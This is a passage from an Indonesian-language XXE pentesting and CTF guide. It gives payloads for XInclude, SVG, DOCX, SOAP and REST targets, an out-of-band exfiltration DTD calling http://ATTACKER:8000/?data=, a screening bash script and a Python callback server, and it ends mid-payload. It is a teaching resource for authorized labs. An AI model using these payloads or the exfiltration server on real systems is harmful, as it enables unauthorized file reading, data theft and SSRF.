> - Parser XML Java legacy yang mengizinkan encoding fleksibel.
>
> Pada web modern dan CTF saat ini, parser XML hampir tidak pernah mendukung UTF-7 secara default (dan UTF-7 telah di-deprecate dari standar modern).
> **Prioritas Pentest:** Selalu prioritaskan wrapper `php://filter` (pada aplikasi PHP), variasi encoding `UTF-16BE` / `UTF-16LE`, atau XML Entities encoding daripada mencoba UTF-7.

---

## CDATA

CDATA:

```xml
<![CDATA[
    arbitrary text
]]>
```

Contoh:

```xml
<value><![CDATA[HELLO]]></value>
```

CDATA sendiri:

```text
≠ XXE bypass
```

Ia hanya mengubah bagaimana character data diparse.

---

# 4.3 XXE via XInclude

## 📌 Kapan Digunakan

Saat:

```text
DOCTYPE/external entity tidak tersedia
```

tetapi parser mendukung XInclude.

---

## XInclude Syntax

```xml
<?xml version="1.0"?>

<root
xmlns:xi="http://www.w3.org/2001/XInclude">

    <xi:include
        href="file:///etc/hostname"
        parse="text"/>

</root>
```

Full curl:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<root
xmlns:xi="http://www.w3.org/2001/XInclude">

    <xi:include
        href="file:///etc/hostname"
        parse="text"/>

</root>
EOF
```

Expected:

```text
web01
```

---

## Flow

```text
XML
 │
 ▼
XInclude
 │
 ▼
file://
 │
 ▼
File
 │
 ▼
Included text
```

Tidak semua XML parser mengaktifkan XInclude.

---

# 4.4 XXE via SVG Upload

## 📌 Kapan Digunakan

Saat aplikasi menerima SVG dan melakukan server-side XML parsing.

SVG adalah XML-based format:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <text>Hello</text>
</svg>
```

---

## Malicious SVG — Lab

File:

```bash
nano xxe.svg
```

Isi:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<svg xmlns="http://www.w3.org/2000/svg"
     width="500"
     height="100">

    <text x="10" y="50">&xxe;</text>

</svg>
```

---

## Upload dengan curl

Misalnya endpoint:

```text
/upload
```

Command:

```bash
curl -i \
-X POST \
-F 'file=@xxe.svg;type=image/svg+xml' \
http://TARGET/upload
```

Expected vulnerable processing:

```text
HTTP/1.1 200 OK
```

dan hasil preview mungkin menampilkan:

```text
web01
```

---

## Blind SVG XXE

SVG:

```xml
<?xml version="1.0"?>

<!DOCTYPE svg SYSTEM "http://ATTACKER:8000/xxe.dtd">

<svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">XXE TEST</text>
</svg>
```

Upload:

```bash
curl -i \
-X POST \
-F 'file=@xxe.svg;type=image/svg+xml' \
http://TARGET/upload
```

Receiver:

```text
GET /xxe.dtd HTTP/1.1
```

---

# 4.5 XXE via XLSX/DOCX

## 📌 Kapan Digunakan

Saat challenge memproses Office Open XML dengan parser yang rentan.

Office Open XML structure:

```text
document.docx
     │
     ▼
ZIP archive
     │
     ├── word/document.xml
     ├── word/_rels/
     ├── [Content_Types].xml
     └── ...
```

XLSX:

```text
workbook.xlsx
     │
     ▼
ZIP
     │
     ├── xl/workbook.xml
     ├── xl/worksheets/
     └── ...
```

---

## Inspect File

```bash
file sample.docx
```

Output:

```text
Microsoft Word 2007+
```

List:

```bash
unzip -l sample.docx | head -30
```

---

## Extract

```bash
mkdir docx_lab
unzip sample.docx -d docx_lab
```

Cari XML:

```bash
find docx_lab -type f -name '*.xml'
```

---

## Important Parser Condition

Tidak cukup hanya:

```text
DOCX contains XML
```

Harus ada:

```text
Office ZIP
 +
application extracts/parses XML
 +
parser allows dangerous entity behavior
```

Banyak modern Office/document processing libraries men-disable DTD/entity expansion secara default.

---

## Repackaging

Setelah modifikasi file XML pada lab:

```bash
cd docx_lab
zip -r ../modified.docx .
```

Lalu upload:

```bash
curl -i \
-F 'file=@../modified.docx' \
http://TARGET/upload
```

---

## Workflow XLSX/DOCX

```text
Office File
    │
    ▼
unzip
    │
    ▼
Find XML part (word/document.xml atau xl/workbook.xml)
    │
    ▼
Inject DTD & Entity
    │
    ▼
Repack ZIP
    │
    ▼
Upload & Observe Execution
```

### Contoh Konkret Modifikasi `word/document.xml` (DOCX):

1. Ekstrak dokumen DOCX:
```bash
unzip sample.docx -d docx_payload/
```

2. Buka dan sisipkan deklarasi DOCTYPE & entity pada file `word/document.xml`:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<w:document 
  xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" 
  xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

3. Repack kembali direktori ke dalam file `.docx`:
```bash
cd docx_payload
zip -r ../exploit.docx *
```

Saat aplikasi backend mengonversi file `exploit.docx` (misal konversi ke PDF, pembuatan thumbnail, atau text preview), entity `&xxe;` akan dievaluasi dan mencetak isi file `/etc/hostname`.

---

# 🚀 5. Advanced XXE

# 5.1 Out-of-Band Data Exfiltration

## 📌 Kapan Digunakan

Saat:

```text
Direct output = no
Error output  = no
External DTD = yes
Network callback = yes
```

---

## Listener

```bash
python3 -m http.server 8000
```

Atau custom receiver dari Section 6.5:

```bash
python3 xxe_dtd_server.py --port 8000
```

---

## DTD

`xxe.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % callback SYSTEM "http://ATTACKER:8000/?data=%file;">
%callback;
```

---

## XML

```xml
<?xml version="1.0"?>

<!DOCTYPE root SYSTEM "http://ATTACKER:8000/xxe.dtd">

<root>
    <item>test</item>
</root>
```

---

## curl

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root SYSTEM "http://ATTACKER:8000/xxe.dtd">

<root>
    <item>test</item>
</root>
EOF
```

---

## Callback

Expected:

```text
GET /xxe.dtd
```

kemudian:

```text
GET /?data=web01
```

---

## Decode Data

Jika data URL-encoded:

```bash
python3 - <<'PY'
from urllib.parse import unquote

value = "%77%65%62%30%31"
print(unquote(value))
PY
```

Output:

```text
web01
```

---

# 5.2 Chaining XXE dengan Vulnerabilities Lain

## 📌 Kapan Digunakan

Setelah primitive XXE sudah terbukti dan challenge membutuhkan pivot lebih lanjut.

---

## XXE + SSRF

```text
XXE
 │
 ▼
External Entity
 │
 ▼
Internal HTTP
 │
 ▼
Admin/API/Service
```

---

## XXE + File Read

```text
XXE
 │
 ▼
file://
 │
 ▼
Configuration
 │
 ▼
Credential/Secret exposure
```

Dalam dokumentasi CTF, gunakan file dummy atau secret yang memang disediakan challenge.

---

## XXE + Log Poisoning

Konsep:

```text
XXE file read / SSRF
       │
       ▼
Application log
       │
       ▼
Injection into log
       │
       ▼
Another vulnerable parser/sink
       │
       ▼
Potential code execution
```

Ini **bukan consequence langsung XXE**.

Harus terdapat beberapa vulnerability tambahan.

---

# 5.3 Billion Laughs Attack — DoS

## 📌 Kapan Digunakan

Untuk memahami **entity expansion DoS**, bukan untuk menyerang production.

Konsep:

```xml
<!ENTITY a "A">
<!ENTITY b "&a;&a;">
<!ENTITY c "&b;&b;">
...
```

Setiap expansion semakin besar:

```text
a → 1
b → 2
c → 4
d → 8
e → 16
...
```

---

## Diagram

```text
Entity A
   │
   ├── A
   └── A

Entity B
   │
   ├── B
   ├── B
   ├── B
   └── B

Entity C
   │
   └── exponential expansion
```

---

## Cara Identify

Indikator:

```text
parser CPU tinggi
memory usage meningkat
request sangat lambat
request diakhiri oleh resource limit
```

Defensive finding:

```text
DTD/entity expansion enabled
+
no expansion limits
=
DoS risk
```

Jangan menjalankan payload bomb pada production.

---

# 🧰 6. Tools & Automation

# 6.1 Burp Suite untuk XXE

## 📌 Kapan Digunakan

Saat request XML kompleks dan perlu mengubah:

```text
Content-Type
DOCTYPE
entity
endpoint
headers
```

---

## Step 1 — Intercept

Request normal:

```http
POST /api/import HTTP/1.1
Host: target
Content-Type: application/json

{"name":"alice"}
```

---

## Step 2 — Change Content-Type

Pada target yang memang menerima XML:

```http
Content-Type: application/xml
```

Body:

```xml
<?xml version="1.0"?>

<user>
    <name>alice</name>
</user>
```

---

## Step 3 — Add DOCTYPE

```xml
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY test "XXE_TEST_123">
]>

<user>
    <name>&test;</name>
</user>
```

---

## Step 4 — Send to Repeater

```text
Proxy
 │
 ▼
Intercept
 │
 ▼
Send to Repeater
 │
 ▼
Modify XML
 │
 ▼
Compare response
```

---

# 6.2 xxeinjector

## 📌 Kapan Digunakan

Saat challenge memang cocok dengan tool dan Anda ingin melakukan automated XXE testing.

Tool availability dan CLI dapat berubah menurut versi/repository, jadi selalu mulai:

```bash
xxeinjector --help
```

atau:

```bash
python3 xxeinjector.py --help
```

Cari binary:

```bash
command -v xxeinjector
```

---

## Basic Workflow

Konsep umum:

```text
Request file
     │
     ▼
xxeinjector
     │
     ├── inject entity
     ├── external DTD
     └── callback
```

Untuk request yang disimpan dari Burp, ikuti syntax help versi tool yang terpasang.

> Jangan mengandalkan command dari write-up lama tanpa memeriksa versi tool.

---

# 6.3 Manual Testing dengan curl

## 📌 Kapan Digunakan

Manual `curl` paling baik digunakan untuk memahami parser sebelum memakai automation.

---

## Template

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/API \
<<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<root>
    <value>&xxe;</value>
</root>
EOF
```

Variabel:

```text
TARGET
API
file:///etc/hostname
root
value
```

---

## File Test Matrix

```text
/etc/hostname
/etc/hosts
/etc/passwd
```

Windows:

```text
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
```

---

# 6.4 Script `xxe_test.sh`

## 📌 Kapan Digunakan

Untuk screening awal endpoint XML yang sudah diketahui.

Input:

```text
URL
```

Optional:

```text
callback URL
```

Script:

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <url> [callback_base]"
    echo
    echo "Example:"
    echo "$0 http://10.10.10.10/api/import"
    echo "$0 http://10.10.10.10/api/import http://10.10.10.20:8000"
    exit 1
}

[[ $# -ge 1 && $# -le 2 ]] || usage

URL="$1"
CALLBACK="${2:-}"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$URL" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] URL contains whitespace${NC}"
    exit 1
fi

if [[ -n "$CALLBACK" ]]; then
    if [[ ! "$CALLBACK" =~ ^https?:// ]]; then
        echo -e "${RED}[!] Callback must start with http:// or https://${NC}"
        exit 1
    fi

    if [[ "$CALLBACK" =~ [[:space:]] ]]; then
        echo -e "${RED}[!] Callback contains whitespace${NC}"
        exit 1
    fi
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required${NC}"
    exit 1
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

echo -e "${BLUE}[*] Target: $URL${NC}"

send_payload() {
    local payload="$1"
    local output="$2"

    curl -ksS \
        -i \
        -X POST \
        -H 'Content-Type: application/xml' \
        --max-time 10 \
        --data-binary "$payload" \
        "$URL" \
        > "$output" 2>&1 || true
}

echo
echo -e "${YELLOW}=== 1. Normal XML ===${NC}"

NORMAL='<?xml version="1.0"?><root><value>XXE_BASELINE</value></root>'

send_payload "$NORMAL" "$TMP/normal"

if grep -Fq 'XXE_BASELINE' "$TMP/normal"; then
    echo -e "${GREEN}[+] Normal XML appears accepted${NC}"
else
    echo "[!] Baseline XML was not visibly accepted"
fi

echo
echo -e "${YELLOW}=== 2. Internal Entity ===${NC}"

INTERNAL='<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test "XXE_TEST_123">
]>
<root><value>&test;</value></root>'

send_payload "$INTERNAL" "$TMP/internal"

if grep -Fq 'XXE_TEST_123' "$TMP/internal"; then
    echo -e "${GREEN}[+] Entity expansion detected${NC}"
else
    echo "[-] Internal entity not visibly expanded"
fi

echo
echo -e "${YELLOW}=== 3. File Entity ===${NC}"

FILE_XML='<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><value>&xxe;</value></root>'

send_payload "$FILE_XML" "$TMP/file"

# Bandingkan panjang response dengan baseline normal untuk menghindari false positive string 'localhost'
BASELINE_LEN=$(wc -c < "$TMP/normal" 2>/dev/null || echo 0)
FILE_LEN=$(wc -c < "$TMP/file" 2>/dev/null || echo 0)

if grep -Eq 'root:x?:[0-9]+:[0-9]+:' "$TMP/file"; then
    echo -e "${GREEN}[+] Valid /etc/passwd disclosure confirmed!${NC}"
elif [[ $FILE_LEN -gt $BASELINE_LEN ]] && grep -Eq '^[A-Za-z0-9._-]{1,128}([[:space:]]|$)' "$TMP/file"; then
    echo -e "${GREEN}[+] Response longer than baseline and matches hostname pattern — possible file disclosure${NC}"
    echo "[!] Validate the exact response manually."
else
    echo "[-] No obvious hostname/file output detected"
fi

if [[ -n "$CALLBACK" ]]; then

    echo
    echo -e "${YELLOW}=== 4. External DTD Callback ===${NC}"

    DTD_URL="${CALLBACK%/}/xxe.dtd"

    BLIND_XML="<?xml version=\"1.0\"?>
<!DOCTYPE root SYSTEM \"${DTD_URL}\">
<root><value>callback-test</value></root>"

    send_payload "$BLIND_XML" "$TMP/blind"

    echo "[*] External DTD URL:"
    echo "    $DTD_URL"
    echo
    echo "[!] Check your callback server logs."
fi

echo
echo -e "${YELLOW}=== Response Preview ===${NC}"

sed -n '1,40p' "$TMP/internal"

echo
echo -e "${YELLOW}=== Summary ===${NC}"
echo "1. Baseline XML accepted    : inspect"
echo "2. Internal entity expansion: inspect"
echo "3. Local file disclosure     : inspect"
echo "4. External DTD callback     : check listener"

echo
echo -e "${YELLOW}Next Steps:${NC}"
echo "1. Confirm XML parser"
echo "2. Identify parser/entity behavior"
echo "3. Confirm result manually in Burp"
echo "4. Test Blind XXE if no output"
echo "5. Test SSRF only in authorized lab"
```

Jalankan:

```bash
chmod +x xxe_test.sh

./xxe_test.sh \
'http://TARGET/api/import'
```

Dengan callback:

```bash
./xxe_test.sh \
'http://TARGET/api/import' \
'http://ATTACKER:8000'
```

---

# 6.5 Script `xxe_dtd_server.py`

## 📌 Kapan Digunakan

Saat ingin menjalankan server sederhana yang:

```text
serve xxe.dtd
log callback
parse query data
```

Gunakan file benign seperti `/etc/hostname` untuk lab.

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys


DTD_TEMPLATE = """<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % callback SYSTEM "http://{host}:{port}/?data=%file;">
%callback;
"""


class DTDHandler(BaseHTTPRequestHandler):

    server_version = "XXE-Lab-Server/1.0"

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now(timezone.utc).isoformat()
        client_ip = self.client_address[0]

        print("\n" + "=" * 60)
        print("XXE CALLBACK")
        print("=" * 60)
        print(f"Timestamp : {timestamp}")
        print(f"Client IP : {client_ip}")
        print(f"Path      : {parsed.path}")

        data = params.get("data", [])

        if data:
            print(f"Data      : {data[0]}")
        else:
            print("Data      : <none>")

        if parsed.query:
            print(f"Query     : {parsed.query}")

        if parsed.path == "/xxe.dtd":

            dtd = DTD_TEMPLATE.format(
                host=self.server.callback_host,
                port=self.server.callback_port
            )

            body = dtd.encode()

            self.send_response(200)
            self.send_header(
                "Content-Type",
                "application/xml-dtd"
            )
            self.send_header(
                "Content-Length",
                str(len(body))
            )
            self.send_header(
                "Cache-Control",
                "no-store"
            )
            self.end_headers()

            self.wfile.write(body)
            return

        body = b"OK\n"

        self.send_response(200)
        self.send_header(
            "Content-Type",
            "text/plain"
        )
        self.send_header(
            "Content-Length",
            str(len(body))
        )
        self.end_headers()

        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


def valid_port(value):
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError(
            "Port must be numeric"
        )

    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(
            "Port must be between 1 and 65535"
        )

    return port


def valid_host(value):
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        if value in ("localhost", "host.docker.internal"):
            return value

        if not all(
            c.isalnum() or c in ".-_"
            for c in value
        ):
            raise argparse.ArgumentTypeError(
                "Invalid hostname"
            )

        return value


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Simple XXE DTD/callback server "
            "for authorized labs."
        )
    )

    parser.add_argument(
        "-p",
        "--port",
        type=valid_port,
        default=8000
    )

    parser.add_argument(
        "--bind",
        type=valid_host,
        default="0.0.0.0"
    )

    parser.add_argument(
        "--callback-host",
        type=valid_host,
        required=True
    )

    parser.add_argument(
        "--callback-port",
        type=valid_port,
        required=True
    )

    args = parser.parse_args()

    try:
        server = HTTPServer(
            (args.bind, args.port),
            DTDHandler
        )
    except OSError as exc:
        print(
            f"[!] Failed to start server: {exc}",
            file=sys.stderr
        )
        sys.exit(1)

    server.callback_host = args.callback_host
    server.callback_port = args.callback_port

    print(
        f"[*] Listening on "
        f"{args.bind}:{args.port}"
    )

    print(
        f"[*] DTD URL: "
        f"http://{args.callback_host}:"
        f"{args.callback_port}/xxe.dtd"
    )

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping server...")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 xxe_dtd_server.py \
--port 8000 \
--callback-host ATTACKER \
--callback-port 8000
```

Expected:

```text
[*] Listening on 0.0.0.0:8000
[*] DTD URL: http://ATTACKER:8000/xxe.dtd
```

---

# 📦 7. XXE di Berbagai Context

# 7.1 XXE di SOAP

## 📌 Kapan Digunakan

Saat endpoint menerima SOAP/XML.

---

## SOAP Structure

```xml
<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>
        <getUser>
            <name>alice</name>
        </getUser>
    </soap:Body>

</soap:Envelope>
```

---

## XXE SOAP

Full payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE soap:Envelope [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>
        <getUser>
            <name>&xxe;</name>
        </getUser>
    </soap:Body>

</soap:Envelope>
```

curl:

```bash
curl -i \
-X POST \
-H 'Content-Type: text/xml' \
-H 'SOAPAction: "getUser"' \
--data-binary @- \
http://TARGET/soap <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE soap:Envelope [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>
        <getUser>
            <name>&xxe;</name>
        </getUser>
    </soap:Body>

</soap:Envelope>
EOF
```

Expected:

```text
web01
```

if the parser is vulnerable and the application reflects the value.

---

# 7.2 XXE di REST dengan XML

## 📌 Kapan Digunakan

Saat REST endpoint menerima XML.

Request:

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
-H 'Accept: application/json' \
--data-binary @- \
http://TARGET/api/user <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<user>
    <name>&xxe;</name>
</user>
EOF
```

---

## Expected

```json
{
  "status": "ok",
  "name": "web01"
}
```

---

# 7.3 XXE di SVG File Upload

## 📌 Kapan Digunakan

Ketika upload parser memproses SVG server-side.

Payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<svg
xmlns="http://www.w3.org/2000/svg"
width="500"
height="100">

    <text
        x="10"
        y="50">&xxe;</text>

</svg>
```

Upload:

```bash
curl -i \
-F 'file=@xxe.svg;type=image/svg+xml' \
http://TARGET/upload
```

Expected:

```text
HTTP 200
```

kemudian preview/result mungkin mengandung:

```text
web01
```

---

# 7.4 XML-Based SSO / SAML

> **Koreksi konsep:** OpenID Connect modern menggunakan JSON/JWT. Konteks XML-based SSO yang relevan untuk pembelajaran adalah **SAML**.

## 📌 Kapan Digunakan

Saat menemukan:

```text
SAMLResponse
RelayState
Assertion
NameID
```

---

## SAML Structure

Konsep:

```text
SAMLResponse
      │
      ▼
Assertion
      │
      ├── Subject
      ├── Conditions
      ├── AuthnStatement
      └── AttributeStatement
```

---

## XML Parser Risk

Jika aplikasi memproses XML SAML dengan parser yang mengizinkan unsafe external entities, maka XML parser misconfiguration dapat menjadi XXE candidate.

Fokus testing:

```text
DOCTYPE support?
Entity resolution?
Schema validation?
Signature validation?
```

Jangan menyamakan:

```text
SAML signature issue
```

dengan:

```text
XXE
```

Mereka adalah kelas masalah yang berbeda.

---

# 🌳 8. Decision Tree

## Standalone XXE Decision Tree

```text
APLIKASI MENERIMA XML
          │
          ▼
   Kirim XML normal
          │
          ▼
    XML diterima?
       │
   ┌───┴────┐
  YES       NO
   │         │
   ▼         ▼
Test Entity  Check:
   │         Content-Type
   │         Schema
   │         Endpoint
   ▼
<!DOCTYPE + entity>
   │
   ▼
Entity resolved?
   │
 ┌─┴───────────────┐
YES                 NO
 │                   │
 ▼                   ▼
Basic XXE         External DTD?
 │                   │
 ├── File read      ├── NO → parser may block DTD
 │                   │
 ├── Error-based    └── YES
 │                         │
 └── SSRF                 ▼
                         Blind XXE
                           │
                    ┌──────┴──────┐
                    ▼             ▼
               External DTD    Error-based
                    │             │
                    ▼             ▼
                 Callback      Error channel
                    │
                    ▼
                  SSRF?
                    │
               ┌────┴────┐
              YES        NO
               │          │
               ▼          ▼
        Internal HTTP   File/OOB
               │
               ▼
         Internal service
```

---

## File Upload Branch

```text
FILE UPLOAD
     │
     ▼
What format?
     │
 ┌───┼────────┬────────┐
 ▼   ▼        ▼        ▼
SVG XML      DOCX     XLSX
 │    │        │        │
 ▼    ▼        ▼        ▼
Parse? Parse?  ZIP/XML  ZIP/XML
 │              │        │
 ▼              ▼        ▼
Test XXE     Inspect parser
 │              │
 ▼              ▼
Callback /  Parser vulnerable?
File read        │
              ┌─┴─┐
             YES  NO
              │    │
              ▼    ▼
            XXE   Stop
```

---

## XML Body Branch

```text
XML REQUEST
     │
     ▼
DOCTYPE allowed?
     │
 ┌───┴────┐
YES       NO
 │         │
 ▼         ▼
Entity     XInclude?
Test         │
 │       ┌───┴───┐
 ▼      YES      NO
Output?   │       │
 │        ▼       ▼
 ├─YES → File   No direct
 │       read    XXE path
 │
 └─NO
    │
    ▼
External DTD
    │
    ▼
Callback?
    │
 ┌──┴──┐
YES    NO
 │      │
 ▼      ▼
Blind  Parser/network
XXE    restriction
```

---

## Per-Technique Quick Map

```text
ENTITY RESOLUTION
       │
       ├── Visible file → Basic XXE
       │       └── file:///etc/hostname
       │
       ├── Error data → Error-Based
       │
       ├── No output → Blind XXE
       │       └── External DTD
       │
       ├── HTTP internal → XXE → SSRF
       │       └── http://127.0.0.1:8080/
       │
       ├── SVG upload → SVG XXE
       │
       └── SOAP → SOAP XXE
```

---

# 🛠️ 9. Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Entity tidak di-resolve|External entities disabled|Coba internal entity untuk membedakan parser behavior|
|`DOCTYPE is disallowed`|Parser menolak DTD|XXE klasik tidak applicable|
|`Entity not declared`|Entity syntax salah|Periksa declaration dan `&name;`|
|Permission denied membaca file|Process tidak memiliki permission|Test file benign yang readable|
|File output kosong|Parser menghapus entity / field tidak direfleksikan|Gunakan marker internal entity terlebih dahulu|
|External DTD tidak loading|Network egress blocked|Cek callback server dan routing lab|
|DTD request terlihat tetapi callback tidak ada|Parameter entity syntax/parser restriction|Uji external DTD sederhana dahulu|
|Callback server tidak mendapat request|Target tidak dapat menjangkau attacker|Verifikasi IP/port/listener|
|Firewall blocking callback|Egress filtering|Gunakan network path yang memang tersedia di lab|
|Timeout|Internal destination tidak reachable|Bandingkan localhost port yang diketahui|
|Encoding issues|XML declaration tidak sesuai actual bytes|Pastikan bytes benar-benar UTF-8/UTF-16|
|CDATA tidak bekerja|CDATA bukan mekanisme XXE|Kembali ke entity/DTD atau parser context|
|Parameter entity invalid|Parameter entities hanya valid pada DTD context tertentu|Letakkan `%name;` dalam external/internal DTD yang sesuai|
|XInclude tidak bekerja|XInclude disabled|Inspect parser configuration|
|SVG upload ditolak|MIME/type/extension validation|Pastikan format valid dan gunakan file SVG sederhana terlebih dahulu|
|SVG diterima tetapi tidak diproses server-side|Browser hanya merender SVG|Cari server-side conversion/preview pipeline|
|DOCX/XLSX tidak vulnerable|Library Office parser aman|Inspect processing library/version and XML parser settings|
|ZIP corruption setelah edit DOCX|Archive structure rusak|Repack seluruh directory, pertahankan relative paths|
|SOAP returns 415|Content-Type salah|Gunakan `text/xml` atau `application/soap+xml` sesuai endpoint|
|SOAP returns 500|XML schema/operation salah|Baseline SOAP request terlebih dahulu|
|HTTP entity menuju localhost gagal|Parser tidak mengizinkan HTTP URI|Test external HTTP DTD separately|
|XXE terlihat tetapi bukan file read|Entity expansion saja belum berarti filesystem access|Bedakan entity resolution dari external file access|
|SSRF test gagal|Internal service tidak ada|Gunakan service yang memang diketahui challenge|
|Port scanning tidak memberi hasil jelas|Error/timing terlalu seragam|Jangan mengandalkan satu signal|
|`/etc/shadow` gagal|Permission denied|Gunakan `/etc/hostname`, `/etc/hosts`, atau file yang memang accessible|
|`php://filter` tidak bekerja|PHP stream wrappers/parser limitation|Confirm target PHP + URI resolution behavior|
|Base64 output rusak|Response escaping/whitespace|Ambil raw response lalu normalise sebelum decode|
|Python receiver tidak start|Port sudah digunakan|Gunakan `--port 8001`|
|Bind error|Host/IP tidak valid|Gunakan `0.0.0.0` atau interface IP yang benar|
|DTD server berjalan tetapi target tidak meminta `/xxe.dtd`|DOCTYPE tidak diproses|Test internal entity terlebih dahulu|
|Entity output menyebabkan XML malformed|File content mengandung special XML bytes|Gunakan file text sederhana atau encoding-safe approach|
|Billion Laughs tidak crash parser|Expansion limit aktif|Itu justru indikator mitigasi parser|
|SAML request tidak vulnerable|Signature/validation issue berbeda dari XXE|Pisahkan analysis SAML auth logic dari XML entity processing|

---

# 🧠 XXE Muscle Memory

Jangan langsung mulai dari:

```text
"Kasih payload XXE."
```

Gunakan urutan:

```text
1. Is XML actually accepted?
          │
          ▼
2. Identify XML parser behavior
          │
          ▼
3. Test normal XML
          │
          ▼
4. Test internal entity
          │
          ▼
5. Test external entity
          │
          ▼
6. Can local file be read?
          │
          ├── YES → Basic XXE
          │
          └── NO
               │
               ▼
          Is output visible?
               │
          ┌────┴────┐
         YES        NO
          │          │
          ▼          ▼
      Error/Data   Blind XXE
                       │
                       ▼
                 External DTD
                       │
                       ▼
                    Callback
                       │
                       ▼
                 XXE → SSRF?
                       │
                       ▼
               Internal Service
```

---

# 🔬 XXE Testing Hierarchy

```text
LEVEL 0
Normal XML
   ↓
LEVEL 1
Internal Entity
   ↓
LEVEL 2
External Entity / File
   ↓
LEVEL 3
External DTD
   ↓
LEVEL 4
Blind/OOB
   ↓
LEVEL 5
SSRF
   ↓
LEVEL 6
Parser-specific chains
```

Jangan melompat langsung ke Level 5.

---

# ✅ Final XXE Checklist

```text
[ ] Endpoint menerima XML
[ ] Content-Type benar
[ ] Normal XML request berhasil
[ ] XML parser behavior dipahami
[ ] Internal entity diuji
[ ] Entity resolution dikonfirmasi
[ ] DOCTYPE behavior diketahui
[ ] Local file read diuji dengan file benign
[ ] Error channel diperiksa
[ ] External DTD diuji
[ ] Callback listener tersedia
[ ] Blind XXE diuji jika diperlukan
[ ] Parameter entities dipahami
[ ] SSRF candidate diperiksa
[ ] Internal service diuji hanya pada lab
[ ] SVG upload diperiksa
[ ] SOAP endpoint diperiksa
[ ] DOCX/XLSX parser behavior diperiksa
[ ] XInclude diperiksa jika relevan
[ ] PHP wrapper hanya diuji pada PHP target
[ ] SAML XML context dibedakan dari OIDC
[ ] DoS/entity expansion hanya dipahami di lab
[ ] Evidence request/response disimpan
[ ] XXE dibuktikan dengan reproducible PoC
```

---

# 🎯 Quick CTF Recipe

Misalnya ditemukan:

```text
POST /api/import
Content-Type: application/xml
```

### 1. Baseline

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>
<root>
    <value>hello</value>
</root>
EOF
```

### 2. Internal Entity

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY test "XXE_TEST_123">
]>

<root>
    <value>&test;</value>
</root>
EOF
```

### 3. File Read

```bash
curl -i \
-X POST \
-H 'Content-Type: application/xml' \
--data-binary @- \
http://TARGET/api/import <<'EOF'
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<root>
    <value>&xxe;</value>
</root>
EOF
```

### 4. Blind XXE

Run:

```bash
python3 xxe_dtd_server.py \
--port 8000 \
--callback-host ATTACKER \
--callback-port 8000
```

Payload:

```xml
<?xml version="1.0"?>

<!DOCTYPE root SYSTEM
